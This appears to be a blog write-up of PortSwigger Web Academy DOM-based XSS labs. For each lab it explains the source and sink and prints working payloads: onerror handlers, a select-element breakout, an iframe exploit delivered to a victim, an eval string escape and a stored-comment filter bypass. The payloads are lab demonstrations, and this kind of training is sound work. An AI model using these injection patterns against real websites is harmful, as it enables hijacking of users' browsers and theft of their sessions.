<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the DOM-Based XSS Vulnerabilities." /><meta property="og:description" content="Intro This post/writeup is all about the DOM-Based XSS Vulnerabilities." /><link rel="canonical" href="https://an9k0r.github.io/posts/DOM-XSS/" /><meta property="og:url" content="https://an9k0r.github.io/posts/DOM-XSS/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-25T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the DOM-Based XSS Vulnerabilities.","headline":"(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)","dateModified":"2023-03-26T17:16:34+02:00","url":"https://an9k0r.github.io/posts/DOM-XSS/","datePublished":"2023-03-25T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/DOM-XSS/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS) | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-03-25 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Sat, Mar 25, 2023, 8:00 AM +0100" >Mar 25</em> </span> <span> Updated <em class="timeago" date="2023-03-26 17:16:34 +0200 " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 26, 2023, 5:16 PM +0200" >Mar 26</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1301 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the DOM-Based XSS Vulnerabilities.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/dom-based">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s.</p><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#dom-xss-in-documentwrite-sink-using-source-locationsearch">DOM XSS in document.write sink using source location.search</a><li><a href="#dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">DOM XSS in document.write sink using source location.search inside a select element</a><li><a href="#dom-xss-in-innerhtml-sink-using-source-locationsearch">DOM XSS in innerHTML sink using source location.search</a><li><a href="#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source">DOM XSS in jQuery anchor href attribute sink using location.search source</a><li><a href="#dom-xss-in-jquery-selector-sink-using-a-hashchange-event">DOM XSS in jQuery selector sink using a hashchange event</a><li><a href="#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</a><li><a href="#reflected-dom-xss">Reflected DOM XSS</a><li><a href="#stored-dom-xss">Stored DOM XSS</a></ul><h1 id="dom-xss-in-documentwrite-sink-using-source-locationsearch">DOM XSS in document.write sink using source location.search</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.</p><p>To solve this lab, perform a cross-site scripting attack that calls the alert function.</p></blockquote><p>I’ll be using DOM Invader to find the sink. We basically put a string and if found in the DOM it should be shown in the DOM invader. In order to use the DOM Invader, Burp’s integrated browser has to be used.</p><p><img data-src="/assets/images/4c505b8b87e2709877b504260e5aaa7fd23bd4621de1fd6a3d9086b05ed2ba36.png" alt="picture 2" data-proofer-ignore></p><p>XSS Exploitation here is straightforward: <code class="language-plaintext highlighter-rouge">"&gt;&lt;img src/onerror=alert(1)&gt;</code></p><p><img data-src="/assets/images/06397d81fbbd2dddf983f06a998fbe90fdd8df8e8fda659d373071801fdebc7a.png" alt="picture 1" data-proofer-ignore></p><h1 id="dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">DOM XSS in document.write sink using source location.search inside a select element</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.</p><p>To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.</p></blockquote><p>This lab has the same optics than the previous lab, hence no screenshot :).</p><p>So we already know what source and sinks are supposed to be BUT let’s check DOM invader. If we select a post, sink (and source if selected in DOM Invder options) will show up.</p><p><img data-src="/assets/images/5914dbaf6e83207e8c612131cd77e8a04c5f8dc20e390b006b6bbb1d0e542239.png" alt="picture 3" data-proofer-ignore></p><p>Injecting into <code class="language-plaintext highlighter-rouge">productId</code> did not work, into <code class="language-plaintext highlighter-rouge">storeId</code> URL parameter did however work, so the website gets loaded dynamically and outputs our input onto the page.</p><p>For example, if we issue following GET request: <code class="language-plaintext highlighter-rouge">https://0a1600de0322ee00c09ea9f800bc00da.web-security-academy.net/product?productId=4&amp;storeId=canary</code> it’ll render option element</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;option</span> <span class="na">selected=</span><span class="s">""</span><span class="nt">&gt;</span>canaryh4eazxxxlocation.searchh4eazxxxURLSearchParamsstoreIdh4eazxxx<span class="nt">&lt;/option&gt;</span>
</pre></table></code></div></div><p>Now can we make an <code class="language-plaintext highlighter-rouge">alert</code> fire?</p><p>… Yes we can!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0a1600de0322ee00c09ea9f800bc00da.web-security-academy.net/product?productId=4&amp;storeId=&lt;script&gt;alert(1)&lt;/script&gt;
</pre></table></code></div></div><p><img data-src="/assets/images/9f7a706442faa1972d1f895eb8c511569824b035ab494ab50889ceecf46ccc1b.png" alt="picture 4" data-proofer-ignore></p><p>Alternatively we could do it like this, so HTML will not break.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>storeId="&gt;<span class="nt">&lt;/select&gt;&lt;img</span><span class="err">%20</span><span class="na">src=</span><span class="s">1%20onerror=alert(1)</span><span class="nt">&gt;</span>
</pre></table></code></div></div><h1 id="dom-xss-in-innerhtml-sink-using-source-locationsearch">DOM XSS in innerHTML sink using source location.search</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.</p><p>To solve this lab, perform a cross-site scripting attack that calls the alert function.</p></blockquote><p>Here i will also use DOM Invader,</p><p><img data-src="/assets/images/f4037fbae59e9846aec99da2fb4d4c63cda636142985ad6adc5cee7e655d97b4.png" alt="picture 5" data-proofer-ignore></p><p>We see the source <code class="language-plaintext highlighter-rouge">location.search</code> and the sink <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p><p>We can use simple XSS payload to trigger the alert!</p><p><img data-src="/assets/images/111a93ddb517775451be51a94a1d9eec72f2c635602b4a6775e1614bc929aaa9.png" alt="picture 6" data-proofer-ignore></p><h1 id="dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source">DOM XSS in jQuery anchor href attribute sink using location.search source</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library’s $ selector function to find an anchor element, and changes its href attribute using data from location.search.</p><p>To solve this lab, make the “back” link alert document.cookie.</p></blockquote><p>In this lab i will also be using DOM invader. If we go to <code class="language-plaintext highlighter-rouge">Submit Feedback</code> and send submit the form, we’ll notice a <code class="language-plaintext highlighter-rouge">returnPath</code> parameter, and this is getting passed (or getting read) in DOM.</p><p><img data-src="/assets/images/bcc8be80eb4f6afd07e10df069341b08c5228bf7b89463159fa9c57d43f78217.png" alt="picture 7" data-proofer-ignore></p><p>We can inject javascript into <code class="language-plaintext highlighter-rouge">returnPath</code> parameter and alert should fire when <code class="language-plaintext highlighter-rouge">back</code> is clicked.</p><p><img data-src="/assets/images/a53b6bdb5842015c7b1e646b54ddad558e74497ee65d18e0c4261e9fff3934ac.png" alt="picture 8" data-proofer-ignore></p><h1 id="dom-xss-in-jquery-selector-sink-using-a-hashchange-event">DOM XSS in jQuery selector sink using a hashchange event</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.</p><p>To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.</p></blockquote><p>In this lab, if we pay attention to DOM Invader, we will notice that source has been found.</p><p><img data-src="/assets/images/f0f9c95e25ad6b14b8504f61ac7a6b2f8bbddb16ca9f12d57ac11c9382d753e7.png" alt="picture 9" data-proofer-ignore></p><p>If we search for <code class="language-plaintext highlighter-rouge">location.href</code>, we’ll find this entry</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
                        <span class="nx">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">hashchange</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
                            <span class="kd">var</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">section.blog-list h2:contains(</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">)</span><span class="dl">'</span><span class="p">);</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nx">post</span><span class="p">)</span> <span class="nx">post</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">scrollIntoView</span><span class="p">();</span>
                        <span class="p">});</span>
                    <span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>This will load title of the post into <code class="language-plaintext highlighter-rouge">$()</code>.</p><p><img data-src="/assets/images/f2299e7506b4ee5720e1259ac9273087001c63b2de01d4a6c6e1c7c5d39ce97a.png" alt="picture 10" data-proofer-ignore></p><p>If we attach simple XSS payload the <code class="language-plaintext highlighter-rouge">print()</code> should open.</p><p><img data-src="/assets/images/125bf14d7c2c51f6aa92eb286d05e220e78e650d23c8cb80b18902691f13d0d2.png" alt="picture 11" data-proofer-ignore></p><p>Payload for victim used:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://0a3d008603576fcdc0b49fdd006900b5.web-security-academy.net/#"</span> <span class="na">onload=</span><span class="s">"this.src+='&lt;img src=x onerror=print()&gt;'"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><p>This fired a <code class="language-plaintext highlighter-rouge">print()</code>.</p><p>I highly recommend checking this video: https://www.youtube.com/watch?v=JgiX3kyK8ME</p><h1 id="dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h1><blockquote><p>This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.</p><p>AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.</p><p>To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.</p></blockquote><p>I’ll again make use of DOM invader to identify sinks and sources.</p><p><img data-src="/assets/images/6237941310bdc3f93adea0b3e6847d336f1daad69f89fc25a1567350a5887905.png" alt="picture 12" data-proofer-ignore></p><p>Payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>
</pre></table></code></div></div><p><img data-src="/assets/images/85a1ec7d5d56b83f53bc471e571b2806cb8c5100e036f30e98312d299d843bd8.png" alt="picture 13" data-proofer-ignore></p><p>Cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (search for “Angular”)</p><h1 id="reflected-dom-xss">Reflected DOM XSS</h1><blockquote><p>This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.</p><p>To solve this lab, create an injection that calls the alert() function.</p></blockquote><p>For this lab i will once again, use DOM invader.</p><p><img data-src="/assets/images/754362aaf8dcd2b5c3cba795c709127a079986cef3fe3899225b25c7084955a8.png" alt="picture 14" data-proofer-ignore></p><p>We have got the sink and the source. Dom invader clearly states that sink is in <code class="language-plaintext highlighter-rouge">eval</code> function, source however is taken from <code class="language-plaintext highlighter-rouge">location.search</code>, hence it is returned from the server (= Reflected).</p><p>Notice the <code class="language-plaintext highlighter-rouge">eval</code> function and <code class="language-plaintext highlighter-rouge">this.responseText</code></p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">search</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">var searchResultsObj = </span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
            <span class="nx">displaySearchResults</span><span class="p">(</span><span class="nx">searchResultsObj</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">path</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>

    <span class="kd">function</span> <span class="nx">displaySearchResults</span><span class="p">(</span><span class="nx">searchResultsObj</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">blogHeader</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">blog-header</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">blogList</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">blog-list</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">searchTerm</span> <span class="o">=</span> <span class="nx">searchResultsObj</span><span class="p">.</span><span class="nx">searchTerm</span>
        <span class="kd">var</span> <span class="nx">searchResults</span> <span class="o">=</span> <span class="nx">searchResultsObj</span><span class="p">.</span><span class="nx">results</span>

        <span class="kd">var</span> <span class="nx">h1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">h1</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">h1</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">searchResults</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> search results for '</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">searchTerm</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">blogHeader</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">h1</span><span class="p">);</span>
</pre></table></code></div></div><p>There is no fast way to exploit this, exept try and error to escape the escaped characters. Fortunately backslash is not escaped and we can break out of what is supposed to be a string. Do note that there should be no spaces in the payload.</p><p><img data-src="/assets/images/de2dfca3a690c0d4298d55475556c5427d6b199d8b9e07f5a7e9922ed60a7050.png" alt="picture 16" data-proofer-ignore></p><p>So let us try to trigger an alert using following payload:</p><p>Payload</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>\"-alert(1)}//
</pre></table></code></div></div><p><img data-src="/assets/images/c7713f051759970a81e3f0ef868d5f6f865f5ffd97833cb33e3dceba7e2d5d27.png" alt="picture 15" data-proofer-ignore></p><p>Alert has fired! Lab has been solved.</p><h1 id="stored-dom-xss">Stored DOM XSS</h1><blockquote><p>This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.</p></blockquote><p>Payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;&gt;&lt;img src/onerror=alert(1)&gt;
</pre></table></code></div></div><p><img data-src="/assets/images/0075e2106837b569824cb6139dc2c6b307af69c20f9f5cc23656d8bcf06569b4.png" alt="picture 17" data-proofer-ignore></p><p>If we check the DOM what’s going on we will see following</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;&amp;gt;</span><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">""</span> <span class="na">onerror=</span><span class="s">"alert(1)"</span><span class="nt">&gt;&lt;/p&gt;</span>
</pre></table></code></div></div><p>This is the explanation from Portswigger:</p><blockquote><p>In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.</p><p>Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored</p></blockquote><p>This is the vulnerable function:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
